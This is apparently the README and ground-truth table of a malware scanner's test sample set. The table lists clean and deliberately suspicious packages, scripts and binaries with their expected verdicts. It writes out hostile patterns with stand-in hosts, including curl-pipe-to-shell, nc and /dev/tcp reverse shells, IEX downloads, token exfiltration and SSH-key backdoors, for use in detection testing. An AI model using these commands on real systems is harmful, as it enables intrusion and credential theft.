# FileGuard 测试样本集（2026-11-15 05:59 PST）

全部样本**无害、不可运行出任何效果**：可疑代码都在 `exit 0` / `return` / `goto :eof` / `WScript.Quit` / `Exit Sub` 之后，或在从不调用的函数里；所有网络地址都是保留地址（`*.invalid`、203.0.113.x、198.51.100.x、192.0.2.x）；PE 入口只有 `xor eax,eax; ret`；ELF 只打印一行；EICAR 是标准杀毒测试串。它们只是让静态分析“看起来可疑”。

随机种子 `241779665888799`（`secrets` 生成；`FG_SEED=<seed> FG_OUT=<dir> python _generator/gen.py` 可复现结构）。生成器在 `tests/samples/_generator/`。

**只提交副本**：引擎只删除自己复制的副本，但为了不弄脏这份样本集，请总是提交临时副本（`tests/run_batch.py` 会自动这样做）。例如 `cp <样本> /tmp/ && fg submit_file /tmp/<文件名> --lang zh`。

## 样本清单（ground truth）

| # | 文件 | 场景 | 类别 | 植入数 | 植入行为（预期严重度） | 预期结论 |
|---|---|---|---|---|---|---|
| 1 | `01_npm_tarball/clean/harbor-ember-87-4.16.2.tgz` | npm_tarball | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 2 | `01_npm_tarball/suspicious/uuidd-2.11.16.tgz` | npm_tarball | 可疑 | 4 | hook_curl_pipe（critical）：install 钩子直接 curl cdn.maple39.invalid | sh<br>decoy_manifest（high）：附带与 package.json 不一致的 package.md，prepare 钩子脚本删除自身并替换清单（反取证）<br>hook_node_dropper（critical）：postinstall 运行 scripts/setup.js，内含按平台分支的下载落地器（钩子脚本命中高危 → 升级严重）<br>typosquat（high）：包名 uuidd 仿冒热门包 | BLOCK |
| 3 | `02_pypi_sdist/clean/fg-pebble-orbit-3.3.18.tar.gz` | pypi_sdist | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 4 | `02_pypi_sdist/suspicious/flaskk-0.12.0.tar.gz` | pypi_sdist | 可疑 | 5 | intree_backend（medium）：pyproject.toml 用不常见的包内自带构建后端（会产生 PY_UNCOMMON_BACKEND + PY_INTREE_BACKEND 两项中危）<br>setup_net_exec（high）：setup.py 中 urllib.request.urlopen(198.51.100.114) 下载后 os.system 执行<br>pth_file（high）：.pth 文件以 import 开头并 exec 解码内容（每次启动 Python 自动执行）<br>typosquat（high）：包名 flaskk 仿冒热门 PyPI 包<br>miner（high）：flaskk/__init__.py: 内嵌矿池地址 stratum+tcp:// 与 xmrig 参数 | HIGH_RISK（安装钩子脚本命中高危特征时可升级为 BLOCK） |
| 5 | `03_pypi_wheel/clean/fg_maple_raven-3.8.19-py3-none-any.whl` | pypi_wheel | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 6 | `03_pypi_wheel/suspicious/fg_xenon_sable-3.17.8-py3-none-any.whl` | pypi_wheel | 可疑 | 2 | cred_paths（low）：引用 ~/.aws/credentials、~/.pypirc、~/.ssh/id_rsa 路径<br>sitecustomize（medium）：wheel 附带 sitecustomize.py | NO_FINDINGS(风险 MEDIUM) 或 INCOMPLETE —— 单一中危不足以升级 |
| 7 | `04_javascript/clean/tool_dates.js` | javascript | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 8 | `04_javascript/suspicious/update-orbit.js` | javascript | 可疑 | 3 | reverse_base64_xor_decoder（high）：反转字符串 + Base64 + XOR 解码器（Axios 投毒同款混淆）<br>env_token_exfil（high）：收集 NPM_TOKEN/GITHUB_TOKEN/AWS_SECRET_ACCESS_KEY 并 fetch 到 zephyr-amber.invalid<br>obfuscated_eval（high）：Base64 编码后 eval 执行（解码内容为 curl|sh 下载执行） | HIGH_RISK |
| 9 | `05_python_script/clean/rename_nimbus.py` | python_script | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 10 | `05_python_script/suspicious/monitor_cobalt.py` | python_script | 可疑 | 5 | env_tokens（high）：读取 AWS_SECRET_ACCESS_KEY/GITHUB_TOKEN/PYPI_TOKEN 并 requests.post 到 cdn.zephyr6.invalid<br>self_delete（medium）：os.remove(__file__) 删除自身<br>cred_paths（low）：引用 ~/.aws/credentials、~/.pypirc、~/.ssh/id_rsa 路径<br>reverse_shell（critical）：Python 反弹 shell 特征串（socket→192.0.2.88，os.dup2）<br>authorized_keys（high）：向 ~/.ssh/authorized_keys 追加公钥（登录后门） | BLOCK |
| 11 | `06_shell_script/clean/rotate.sh` | shell_script | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 12 | `06_shell_script/suspicious/fix-summit.sh` | shell_script | 可疑 | 3 | curl_pipe（high）：curl cinder-lattice.invalid | bash 下载即执行<br>nc_shell（critical）：nc -e /bin/sh 反弹 shell 特征<br>bashrc（low）：往 ~/.bashrc 追加启动命令 | BLOCK |
| 13 | `07_powershell/clean/Get-ServicesReport.ps1` | powershell | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 14 | `07_powershell/suspicious/Install-Yonder.ps1` | powershell | 可疑 | 3 | iex_download（high）：IEX (New-Object Net.WebClient).DownloadString(api.lattice-sync.invalid)<br>defender_off（medium）：Set-MpPreference 关闭 Defender 实时防护<br>run_key（low）：写 HKCU Run 键自启动 | HIGH_RISK |
| 15 | `08_batch/clean/prepare.bat` | batch | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 16 | `08_batch/suspicious/setup_tundra.bat` | batch | 可疑 | 5 | bitsadmin（high）：bitsadmin /transfer 下载后执行<br>wevtutil（medium）：wevtutil cl 清除事件日志<br>copy_masquerade（high）：复制 cmd.exe 为伪装名 exe<br>ps_hidden_enc（high）：powershell -w hidden -ep bypass -enc<br>certutil（high）：certutil -urlcache 下载并运行 exe | HIGH_RISK |
| 17 | `09_vbscript/clean/count_nimbus.vbs` | vbscript | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 18 | `09_vbscript/suspicious/scan_6561.vbs` | vbscript | 可疑 | 4 | ps_hidden（medium）：WScript.Shell 以隐藏窗口+Bypass 启动 PowerShell<br>copy_masquerade（high）：copy wscript.exe 伪装成其他 exe<br>regsvr32（medium）：regsvr32 /i:http scrobj（Squiblydoo）<br>startup（low）：复制自身到 Startup 启动文件夹 | HIGH_RISK<br>备注：mshta 与 regsvr32 在引擎里同属 LOLBIN_DOWNLOAD，只算一项中危 |
| 19 | `10_php/clean/contact_nimbus.php` | php | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 20 | `10_php/suspicious/upload-raven.php` | php | 可疑 | 3 | assert_cookie（high）：assert($_COOKIE) 变种<br>eval_post（high）：eval($_POST[...]) 一句话木马特征<br>miner（high）：矿池地址 stratum+tcp | HIGH_RISK |
| 21 | `11_office_ooxml/clean/team_offsite_agenda.docx` | office_ooxml | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 22 | `11_office_ooxml/suspicious/Contract_71124.docx` | office_ooxml | 可疑 | 3 | dde_field（high）：DDEAUTO 字段调用 cmd.exe（只 echo）<br>external_ole（high）：外部链接 OLE 对象 → cdn.cobalt11.invalid<br>remote_template（high）：远程模板注入 attachedTemplate → http://192.0.2.108 | HIGH_RISK |
| 23 | `12_pdf/clean/event_schedule_2026.pdf` | pdf | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE） |
| 24 | `12_pdf/suspicious/invoice_431.pdf` | pdf | 可疑 | 4 | uri_ip（low）：链接注释指向裸 IP 198.51.100.65（仅网络指标）<br>obf_js（medium）：PDF 内 JS 用 eval(unescape(...)) 混淆（解码只是 app.alert(1)）<br>openaction_js（medium）：/OpenAction 打开即执行 JavaScript（JS 内容是 if(false) 死代码）<br>launch（high）：/Launch 动作启动 cmd.exe（只 echo） | HIGH_RISK |
| 25 | `13_zip_archive/clean/ember_photos_and_notes.zip` | zip_archive | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：含一层嵌套 zip，内容全是文本/CSV/PNG |
| 26 | `13_zip_archive/suspicious/delivery_649.zip` | zip_archive | 可疑 | 3 | eicar（critical）：EICAR 标准杀毒测试文件（无害，ClamAV/YARA 必报）<br>curl_script（high）：内含 curl|sh 下载执行脚本<br>pe_as_jpg（high）：PE 可执行文件伪装成 .jpg（PE 本身是无害最小程序）（内层 zip） | BLOCK |
| 27 | `14_nested_archive/clean/maple_project_backup.7z` | nested_archive | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：7z → tar.gz → zip 三层，内容全是普通文件 |
| 28 | `14_nested_archive/suspicious/backup_215.7z` | nested_archive | 可疑 | 1 | js_dropper（high）：内含按平台分支下载落地的 JS（第 1 层：7z） | HIGH_RISK |
| 29 | `15_pe_windows/clean/tinycalc_cobalt.exe` | pe_windows | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：手工构造的最小 PE32，入口只有 xor eax,eax; ret；无签名（引擎只给 info） |
| 30 | `15_pe_windows/suspicious/Receipt_5708.exe` | pe_windows | 可疑 | 1 | miner_string（high）：内嵌矿池地址 stratum+tcp:// 与 xmrig | HIGH_RISK<br>备注：入口只有 xor eax,eax; ret，导入的 API 从不调用 |
| 31 | `16_elf_linux/clean/calc-ember` | elf_linux | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：gcc 编译的 hello world |
| 32 | `16_elf_linux/suspicious/notes_56` | elf_linux | 可疑 | 3 | miner（high）：内嵌矿池地址<br>reverse_shell_str（critical）：内嵌反弹 shell 命令字符串（从不使用）<br>ld_preload（medium）：引用 /etc/ld.so.preload | BLOCK<br>备注：main() 只打印 ok；可疑字符串只是数据 |
| 33 | `17_debian_deb/clean/fg-meadow_2.11.25_all.deb` | debian_deb | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：postinst 只 echo |
| 34 | `17_debian_deb/suspicious/fg-pixel_0.4.14_all.deb` | debian_deb | 可疑 | 5 | curl_pipe（high）：postinst curl orbit.update.invalid | bash 下载即执行<br>sudoers_d（high）：postinst 写 /etc/sudoers.d/ 提权<br>ld_preload（high）：postinst 写 /etc/ld.so.preload 全局库劫持<br>reverse_shell（critical）：postinst bash -i >& /dev/tcp/203.0.113.16 反弹 shell 特征<br>disable_sec（medium）：postinst 关闭 SELinux / ufw / iptables | BLOCK<br>备注：postinst 首行 exit 0；postinst 是安装钩子，命中高危 YARA 时引擎会升级为严重 |
| 35 | `18_rpm/clean/fg-amber-0.13.8-1.noarch.rpm` | rpm | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：无 scriptlet |
| 36 | `18_rpm/suspicious/fg-nimbus-4.12.28-1.noarch.rpm` | rpm | 可疑 | 2 | disable_sec（medium）：%post 关闭 SELinux / ufw / iptables<br>authorized_keys（high）：%post 追加 SSH 公钥到 authorized_keys | HIGH_RISK（安装钩子脚本命中高危特征时可升级为 BLOCK）<br>备注：%post 首行 exit 0 |
| 37 | `19_msi_installer/clean/KeplerBirch-1.7.4.msi` | msi_installer | 干净 | 0 | — | NO_FINDINGS（环境缺项时可能 INCOMPLETE）<br>备注：只有 Property/Registry 表，不可安装 |
| 38 | `19_msi_installer/suspicious/BirchUpdater-4.16.7.msi` | msi_installer | 可疑 | 2 | ca_vbscript（medium）：CustomAction(VBScript, type 38) 内联脚本<br>ca_cmd_http（medium）：CustomAction(EXE, type 50) cmd 下载 | NO_FINDINGS(风险 MEDIUM) 或 INCOMPLETE —— 单一中危不足以升级<br>备注：CustomAction 未排入任何执行序列，永不运行。注意疑似引擎 bug：msi_checks 用 ca[3:] 丢掉前 3 条 CustomAction（msiinfo export 的表头行本就不匹配正则），因此 ≤3 条 CustomAction 时可能全部漏报（预期结论里的 CustomAction 中危实际可能不出现） |

预期结论按引擎 verdict.py 规则推算：任一严重 → BLOCK；任一高危 → HIGH_RISK；≥2 种不同中危 → HIGH_RISK；否则 NO_FINDINGS，有缺项则 INCOMPLETE。实际结果还取决于 ClamAV 病毒库是否新鲜、依赖/注册表联网查询是否成功；引擎可能还会报出植入项之外的附带信号（例如解码后的 Base64 再次命中 YARA）。

## pkg / url 模式的额外干净用例（真实公开包；可疑样本绝不上传到网上）

- `fg submit_pkg npm left-pad 1.3.0 --lang zh` → NO_FINDINGS（源码比对/注册表查询缺项时 INCOMPLETE）
- `fg submit_pkg npm ms 2.1.3 --lang zh` → NO_FINDINGS
- `fg submit_pkg pypi requests 2.32.3 --lang zh` → NO_FINDINGS / INCOMPLETE（依赖较多）
- `fg submit_url https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz --lang zh` → NO_FINDINGS
- `fg submit_url https://files.pythonhosted.org/packages/f9/9b/335f9764261e915ed497fcdeb11df5dfd6f7bf257d4a6a2a686d80da4d54/requests-2.32.3-py3-none-any.whl --lang zh --expected-sha256 70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6` → NO_FINDINGS / INCOMPLETE

## 引擎支持但这次没造的格式

- NSIS / Inno Setup / InstallShield 安装包（box 上没有对应编译器）
- Mach-O（引擎对 Mach-O 恒报缺项 MACHO_CODESIGN_NOT_VERIFIED，必然 INCOMPLETE）
- RAR（没有 rar 打包器）
- 加密压缩包（结果是 INCOMPLETE，不属于干净/可疑二分）
